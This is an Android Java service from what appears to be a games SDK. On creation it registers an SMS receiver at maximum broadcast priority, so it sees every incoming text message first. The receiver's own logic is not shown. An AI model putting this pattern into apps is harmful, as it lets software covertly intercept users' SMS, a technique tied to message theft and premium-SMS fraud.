package zonesdk.in.android.games.in.service;

import zonesdk.in.android.games.in.receiver.SMSReceiver;
import zonesdk.in.android.games.in.utils.RuntimeLog;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class SMSReceiverService extends Service {
	private SMSReceiver receiver;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		RuntimeLog.log("SMSReceiverService.onCreate");

		//
        receiver = new SMSReceiver(this);            
        IntentFilter filter = new IntentFilter();  
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");  
        filter.setPriority(2147483647);
        registerReceiver(receiver, filter);  

    

	}
	
	
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		
		RuntimeLog.log("SMSReceiverService.onStart()");
		
	}
	
	@Override
	public void onDestroy() {  
	    super.onDestroy();  
	    unregisterReceiver(receiver);  
	}  

}
